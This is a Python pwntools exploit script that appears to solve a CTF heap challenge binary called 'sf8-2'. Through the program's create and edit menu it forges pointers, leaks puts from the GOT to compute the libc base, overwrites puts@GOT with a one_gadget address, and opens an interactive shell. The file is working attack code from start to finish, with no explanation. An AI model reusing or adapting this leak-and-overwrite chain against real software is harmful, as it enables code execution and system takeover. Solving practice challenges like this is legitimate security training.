from pwn import*
p = process('./sf8-2')

# gadget
t = 0.2
bss = 0x6020a0 + 0x100
puts_got = 0x602028
# definition
def create(name,kind,age):
	p.sendline('1');sleep(t)
	p.sendlineafter('> ',name);sleep(t)
	p.sendlineafter('> ',kind);sleep(t)
	p.sendlineafter('> ',age);sleep(t)

def edit(index,name,kind,age):
	p.sendline('2');sleep(t)
	p.sendlineafter('> ',index);sleep(t)
	p.sendlineafter('> ',name);sleep(t)
	p.sendlineafter('> ',kind);sleep(t)
	p.sendlineafter('> ',age);sleep(t)
	
# leak
create('name','kind','0')			# index 0
edit('0','name','kind','0')
p.sendline('n');sleep(t)
create('name',p64(0x6020b0)+p64(bss),'1')	# index 1
edit('0',p64(bss),p64(puts_got),'2')		# index 2
p.sendline('y');sleep(t)
p.sendline('4');sleep(t)			# print_all

p.recvuntil('id: 2\nname: ')	
libc_puts = u64(p.recv(6).ljust(8,'\x00'))
#libc_base = libc_puts - 456336
libc_base = libc_puts - 456352
#one_list = [0x45216,0x4526a,0xf02a4,0xf1147]
one_list = [0x45226,0x4527a,0xf0364,0xf1207]
print 'libc_puts : '+hex(libc_puts)
print 'libc_base : '+hex(libc_base)

# exploit

create('name','kind','3')			# index 3
create('name','kind','4')			# index 4
edit('4','name','kind','4')			
p.sendline('n');sleep(t)
create('name',p64(0x6020c8)+p64(puts_got),'5')	# index 5

edit('4',p64(puts_got),p64(libc_base+one_list[3]),'6')

p.sendline('y');sleep(t)
p.interactive()
